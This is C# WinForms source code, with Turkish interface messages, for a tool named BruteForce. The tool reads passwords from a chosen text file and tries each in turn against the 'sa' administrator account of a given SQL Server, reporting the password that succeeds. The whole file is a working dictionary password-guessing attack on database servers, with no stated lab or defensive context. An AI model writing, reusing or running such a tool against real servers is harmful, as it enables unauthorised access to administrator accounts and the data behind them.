using DevExpress.XtraEditors;
using System;
using System.Data;
using System.Data.SqlClient;
using System.IO;
using System.Windows.Forms;
namespace BruteForce
{
    public partial class BruteForce : DevExpress.XtraEditors.XtraForm
    {
        public BruteForce()
        {
            InitializeComponent();
        }
        int passwordcount = 0, k = 0, readarray = 0;
        string filepath = string.Empty, value = string.Empty, servername = string.Empty;
        private void BruteForce_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode==Keys.Escape)
            Application.Exit();
        }
        private void simpleButton1_Click_1(object sender, EventArgs e)
        {
            if (Txt_ServerName.Text == "" || Txt_ServerName.Text == null)
            {
                XtraMessageBox.Show($"SERVER ADI VEYA IP ADRESI BOŞ GEÇİLEMEZ !!", "SQL GİRİŞ İŞLEMİ !!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Txt_ServerName.Focus();
            }
            else
            {
                servername = Txt_ServerName.Text;
                bool status = true;
                passwordcount = Convert.ToInt32(numericUpDown1.Value);
                StreamReader sr = new StreamReader($@"{filepath}");
                string[] line = new string[passwordcount];
                value = sr.ReadLine();
                while (value != null)
                {
                    if (k < passwordcount)
                    {
                        line[k] = value;
                        k++;
                        value = sr.ReadLine();
                    }
                    else
                        break;
                }
                k = 0;
                readarray = 0;
                go:
                try
                {
                    for (int i = readarray; i < line.Length;)
                    {
                        SqlConnection connection = new($@"Server={servername};Database=master;User=sa;Pwd={line[i]}");
                        readarray++;
                        connection.Open();
                        if (((connection.State & ConnectionState.Open) != 0))
                        {
                            XtraMessageBox.Show($"GİRİŞ İŞLEMİ BAŞARILI ŞİFRENİZ = {line[i]}", "SQL GİRİŞ İŞLEMİ BAŞARILI BAĞLANTI KURULDU !!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            status = false;
                            break;
                        }
                    }
                }
                catch (Exception)
                {
                    goto go;
                }
                if (status)
                    XtraMessageBox.Show($"SQL ŞİFRENİZ METİN İÇERİSİNDEN BULUNAMADI !!", "SQL GİRİŞ İŞLEMİ TARAMA ŞİFRENİZ YOK !!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void BruteForce_Load(object sender, EventArgs e)
        {
        }
        private void simpleButton1_Click(object sender, EventArgs e)
        {
            openFileDialog1.Filter = "Text Dosyası |*.txt";
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                filepath = openFileDialog1.FileName.ToString();
                TryPassword.Enabled = true;
            }

        }
    }
}